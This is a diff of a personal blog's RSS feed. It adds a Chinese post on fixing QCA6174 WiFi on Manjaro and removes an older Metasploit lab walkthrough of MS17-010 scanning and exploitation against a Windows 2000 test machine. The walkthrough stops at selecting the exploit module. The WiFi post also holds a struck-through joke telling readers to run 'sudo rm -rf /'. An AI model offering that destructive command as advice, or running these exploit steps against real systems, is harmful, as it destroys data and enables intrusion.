@@ -6,9 +6,80 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>2019-2021 | WeepingDogel via CC-BY-NC 4.0</copyright>
-    <lastBuildDate>Tue, 02 Feb 2021 13:43:23 +0800</lastBuildDate>
+    <lastBuildDate>Mon, 15 Mar 2021 00:24:06 +0800</lastBuildDate>
     
         <atom:link href="https://weepingdogel.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>如何解决 Manjaro 中 QCA6174 网卡问题</title>
+        <link>https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/</link>
+        <pubDate>Fri, 17 Jul 2020 10:30:59 +0800</pubDate>
+        
+        <guid>https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/</guid>
+        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/ -&lt;h2 id=&#34;开场白&#34;&gt;开场白&lt;/h2&gt;
+&lt;p&gt;尝试在 Redmibook 14 中安装了 Manjaro, 装完发现 WIFI 不能用&lt;/p&gt;
+&lt;p&gt;此时陷入了疑惑, 难道 Manjaro 也不自带 linux-firmware ?&lt;/p&gt;
+&lt;p&gt;总之经过了一系列折腾, 最后还是解决了, 写篇东西来记录一下解决的过程&lt;/p&gt;
+&lt;h2 id=&#34;尝试使用其他方法连接网络&#34;&gt;尝试使用其他方法连接网络&lt;/h2&gt;
+&lt;p&gt;既然 WIFI 不能用, 那也要想别的办法联网, 不然这问题就很棘手了&lt;/p&gt;
+&lt;p&gt;我能想到的是插网线, 可这是轻薄本, 没有有限网卡, 那么我们还有一种办法, 使用手机的 USB 网络共享&lt;/p&gt;
+&lt;p&gt;这个过程很简单, 按照以下步骤走&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;使用 USB 数据线将电脑与手机连接, 并打开 USB 网络共享&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;del&gt;这个都不会的, 可以执行 &lt;code&gt;sudo rm -rf /&lt;/code&gt;&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;这智商, 玩你妈的 Linux&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;不会的, 请&lt;a href=&#34;https://jingyan.baidu.com/article/09ea3ede1cfbf1c0aede391d.html&#34;&gt;参考这里&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;打开终端, 执行&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo ip link
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后它会返回这样的东西, 如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-07-17_11-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置网卡&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo ip link set enp3s0f4u2 up
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行 &lt;code&gt;dhcpcd&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo dhcpcd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来, 我试着运行 &lt;code&gt;ifconfig&lt;/code&gt;, 可是不能用, 但是看了一眼 &lt;code&gt;network manager&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;嗯 能上网了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/photo_2020-07-16_23-31-07.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;解决过程&#34;&gt;解决过程&lt;/h2&gt;
+&lt;h3 id=&#34;软件源&#34;&gt;软件源&lt;/h3&gt;
+&lt;p&gt;我们会进行软件包的装卸, 所以我们首先需要做的是选择合适的软件源&amp;hellip;.&lt;/p&gt;
+&lt;p&gt;ok, 现在我们需要修改的文件是这个&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;/etc/pacman.d/mirrorlist
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们用 &lt;code&gt;nano&lt;/code&gt; 改, 记得加 &lt;code&gt;sudo&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo nano /etc/pacman.d/mirrorlist
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将 &lt;code&gt;# China&lt;/code&gt; 下面的内容 放到第一行&lt;/p&gt;
+&lt;p&gt;至于 &lt;code&gt;nano&lt;/code&gt; 的用法, 请自行查找资料, 会用记事本就会用这个&lt;/p&gt;
+&lt;p&gt;修改完后, 如图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/photo_2020-07-16_23-48-54.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -Sy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;安装-linux-firmware&#34;&gt;安装 &lt;code&gt;linux-firmware&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo pacman -S linux-firmware
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启之后, 发现还是无效, 此时我去谷歌查了一下.&lt;/p&gt;
+&lt;p&gt;发现, 我们需要手动从 &lt;a href=&#34;https://github.com/FireWalkerX/ath10k-firmware/tree/master/QCA6174/hw3.0&#34;&gt;Github&lt;/a&gt; 下载它的驱动文件&lt;/p&gt;
+&lt;h3 id=&#34;手动替换驱动文件&#34;&gt;手动替换驱动文件&lt;/h3&gt;
+&lt;p&gt;到上面那个链接指向的 Github 仓库, 下载 &lt;code&gt;board-2.bin&lt;/code&gt; 和 &lt;code&gt;firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1&lt;/code&gt;, 分别将它们重命名为: &lt;code&gt;board.bin&lt;/code&gt; 和 &lt;code&gt;firmware-4.bin&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/board-2.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后把这两个文件复制到 &lt;code&gt;/lib/firmware/ath10k/QCA6174/hw3.0/&lt;/code&gt; 目录下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo cp board.bin /lib/firmware/ath10k/QCA6174/hw3.0/board.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ sudo cp firmware-4.bin /lib/firmware/ath10k/QCA6174/hw3.0/firmware-4.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重启系统, WIFI 就能用了.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/photo_2020-07-19_23-12-18.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+&lt;p&gt;以上内容均为 Redmibook 14 的解决过程, 并不一定适用于其他设备, 因此仅供参考.&lt;/p&gt;
+- https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
+        </item>
     
     
     
@@ -2550,513 +2621,6 @@ Examples:
 &lt;/blockquote&gt;
 &lt;hr&gt;
 - https://weepingdogel.github.io/posts/%E5%A4%8F%E5%B0%94%E5%87%A1%E5%A4%9A%E5%A7%86%E6%B5%B7%E5%A8%81%E8%AF%AD%E5%BD%95/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>震惊！16岁男子竟然在家里做出这种事！</title>
-        <link>https://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</link>
-        <pubDate>Fri, 26 Jul 2019 22:52:54 +0800</pubDate>
-        
-        <guid>https://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</guid>
-        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/ -&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
-&lt;p&gt;该男子居然在家做出这种事情，使多数人震惊！&lt;/p&gt;
-&lt;h2 id=&#34;这才是真正的简介&#34;&gt;这才是真正的简介&lt;/h2&gt;
-&lt;p&gt;哈哈，上面那个是假的，本篇博客将会复现MS17-010漏洞攻击。&lt;/p&gt;
-&lt;h3 id=&#34;ms17-010是啥啊&#34;&gt;MS17-010是啥啊？&lt;/h3&gt;
-&lt;p&gt;你是否记得2017年的那个勒索病毒？就是不给钱就把你电脑里所有的AV加密起来的一个病毒。是不是很可怕？这个病毒就是通过这个漏洞让更多的人看不到AV的。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;那这个漏洞是怎样的呢？我将给出以下链接用于参考：&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010&#34;&gt;Microsoft 安全公告 MS17-010 - 严重&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cvedetails.com/cve/CVE-2017-0143/&#34;&gt;https://cvedetails.com/cve/CVE-2017-0143/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cvedetails.com/cve/CVE-2017-0144/&#34;&gt;https://cvedetails.com/cve/CVE-2017-0144/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cvedetails.com/cve/CVE-2017-0145/&#34;&gt;https://cvedetails.com/cve/CVE-2017-0145/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cvedetails.com/cve/CVE-2017-0146/&#34;&gt;https://cvedetails.com/cve/CVE-2017-0146/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cvedetails.com/cve/CVE-2017-0147/&#34;&gt;https://cvedetails.com/cve/CVE-2017-0147/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cvedetails.com/cve/CVE-2017-0148/&#34;&gt;https://cvedetails.com/cve/CVE-2017-0148/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://github.com/RiskSense-Ops/MS17-010&#34;&gt;https://github.com/RiskSense-Ops/MS17-010&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;攻击复现&#34;&gt;攻击复现&lt;/h2&gt;
-&lt;p&gt;那么，我们来复现一下这个漏洞的攻击流程吧。在这里，我给大家安利一个&lt;a href=&#34;https://baike.baidu.com/item/linux/27050?fr=aladdin&#34;&gt;Linux&lt;/a&gt;的渗透测试软件包。叫做&lt;strong&gt;Metasploit&lt;/strong&gt;。 它在作为&lt;strong&gt;渗透测试的发行版&lt;/strong&gt;中是自带的，如果你用的不是&lt;strong&gt;作为渗透测试的发行版&lt;/strong&gt;，那么以下是安装方法：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;基于Arch&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo pacman -S metasploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
-&lt;li&gt;基于Debian更新源里有的&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo apt-get install metasploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
-&lt;li&gt;rpm系或deb系源里没有的&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo chmod &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;755&lt;/span&gt; msfinstall &amp;amp;&amp;amp; ./msfinstall
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
-&lt;li&gt;Windows嘛….&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;两个选择&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;请到&lt;a href=&#34;https://www.metasploit.com/&#34;&gt;MSF官网&lt;/a&gt;下载，并且耐心等待。&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://weepingdogel.github.io/posts/linux_mint_%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/&#34;&gt;出门左转&lt;/a&gt;安装Linux&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;复现过程&#34;&gt;复现过程&lt;/h2&gt;
-&lt;blockquote&gt;
-&lt;p&gt;重要的事情说三遍：&lt;/p&gt;
-&lt;p&gt;接下来就是最重要的一部分，你一定要认真看！认真看！认真看！&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;攻击环境&#34;&gt;攻击环境&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;&lt;/th&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;攻击机&lt;/th&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;靶机&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;操作系统&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;Arch Linux&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;Windows2K&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;IP地址&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;192.168.42.141&lt;/td&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;192.168.42.252&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;靶机截图:
-&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-07-26_21-57-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;攻击过程&#34;&gt;攻击过程&lt;/h3&gt;
-&lt;p&gt;首先，攻击机打开终端，输入 &lt;strong&gt;&lt;code&gt;msfconsole&lt;/code&gt;&lt;/strong&gt; ，并按回车等待。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo msfconsole
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;建议加上&lt;code&gt;sudo&lt;/code&gt;，以免出现未知错误。&lt;/p&gt;
-&lt;p&gt;稍等片刻，metasploit就打开了。如图&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-07-26_22-04-07.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;接下来，通过 &lt;strong&gt;&lt;code&gt;search&lt;/code&gt;&lt;/strong&gt; 命令本次要利用到的MS17_010模块&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; search ms17_010
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后就跳出一大堆&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Matching Modules
-================
-
-   #  Name                                           Disclosure Date  Rank     Check  Description
-   -  ----                                           ---------------  ----     -----  -----------
-   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
-   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
-   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
-   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
-   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; use auxiliary/scanner/smb/smb_ms17_010
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;blockquote&gt;
-&lt;p&gt;顺便一提，metasploit是一款渗透测试工具，如果你想了解这些模块是怎么运作的，那么你要掌握这几条命令：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;search&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;用于搜素模块，然后列出这个模块使用方式，如上面演示的一样。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;2&#34;&gt;
-&lt;li&gt;info&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;显示该模块的详细信息。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;3&#34;&gt;
-&lt;li&gt;show + [option]&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;显示该模块的部分信息。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;4&#34;&gt;
-&lt;li&gt;show options&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;显示该模块需要设置的项目&lt;/li&gt;
-&lt;/ul&gt;
-&lt;ol start=&#34;5&#34;&gt;
-&lt;li&gt;show payloads&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;显示该模块可使用的攻击载荷&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;注意，第三条和第四条不要搞混了，第二条那个[option]是指代。&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;hr&gt;
-&lt;p&gt;回归正题，我们先看看这个模块的信息。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 auxiliary(scanner/smb/smb_ms17_010) &amp;gt; info
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后又出了一大堆qwq…&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;    Name: MS17-010 SMB RCE Detection
-     Module: auxiliary/scanner/smb/smb_ms17_010
-    License: Metasploit Framework License (BSD)
-       Rank: Normal
-
-Provided by:
-  Sean Dillon &amp;lt;sean.dillon@risksense.com&amp;gt;
-  Luke Jennings
-
-Check supported:
-  Yes
-
-Basic options:
-  Name         Current Setting                                 Required  Description
-  ----         ---------------                                 --------  -----------
-  CHECK_ARCH   true                                            no        Check for architecture on vulnerable hosts
-  CHECK_DOPU   true                                            no        Check for DOUBLEPULSAR on vulnerable hosts
-  CHECK_PIPE   false                                           no        Check for named pipe on vulnerable hosts
-  NAMED_PIPES  /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
-  RHOSTS                                                       yes       The target address range or CIDR identifier
-  RPORT        445                                             yes       The SMB service port (TCP)
-  SMBDomain    .                                               no        The Windows domain to use for authentication
-  SMBPass                                                      no        The password for the specified username
-  SMBUser                                                      no        The username to authenticate as
-  THREADS      1                                               yes       The number of concurrent threads
-
-Description:
-  Uses information disclosure to determine if MS17-010 has been 
-  patched or not. Specifically, it connects to the IPC$ tree and 
-  attempts a transaction on FID 0. If the status returned is 
-  &amp;#34;STATUS_INSUFF_SERVER_RESOURCES&amp;#34;, the machine does not have the 
-  MS17-010 patch. If the machine is missing the MS17-010 patch, the 
-  module will check for an existing DoublePulsar (ring 0 
-  shellcode/malware) infection. This module does not require valid SMB 
-  credentials in default server configurations. It can log on as the 
-  user &amp;#34;\&amp;#34; and connect to IPC$.
-
-References:
-  https://cvedetails.com/cve/CVE-2017-0143/
-  https://cvedetails.com/cve/CVE-2017-0144/
-  https://cvedetails.com/cve/CVE-2017-0145/
-  https://cvedetails.com/cve/CVE-2017-0146/
-  https://cvedetails.com/cve/CVE-2017-0147/
-  https://cvedetails.com/cve/CVE-2017-0148/
-  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
-  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
-  https://github.com/countercept/doublepulsar-detection-script
-  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-
-Also known as:
-  DOUBLEPULSAR
-  ETERNALBLUE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然而这里我们只需要看那个&lt;strong&gt;Basic options&lt;/strong&gt;部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个&lt;strong&gt;目标IP(RHOST)&lt;/strong&gt;，而那个 &lt;strong&gt;RPORT(目标端口)&lt;/strong&gt; 已经被指定为445了。&lt;/p&gt;
-&lt;p&gt;接下来执行…&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 auxiliary(scanner/smb/smb_ms17_010) &amp;gt; set rhost 192.168.42.252
-msf5 auxiliary(scanner/smb/smb_ms17_010) &amp;gt; run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;返回后我们得到了这些&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;[+] 192.168.42.252:445    - Host is likely VULNERABLE to MS17-010! - Windows 5.0 x86 (32-bit)
-[*] 192.168.42.252:445    - Scanned &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1&lt;/span&gt; of &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1&lt;/span&gt; hosts (100% complete)
-[*] Auxiliary module execution completed
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-07-26_22-57-39.png&#34; alt=&#34;&#34;&gt;
-说明目标是存在MS17_010漏洞的，那么我们接下来将要使用的是攻击模块，也就是上面搜索到的最后一个。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;exploit/windows/smb/ms17_010_psexec&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;那么，执行&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 auxiliary(scanner/smb/smb_ms17_010) &amp;gt; use exploit/windows/smb/ms17_010_psexec
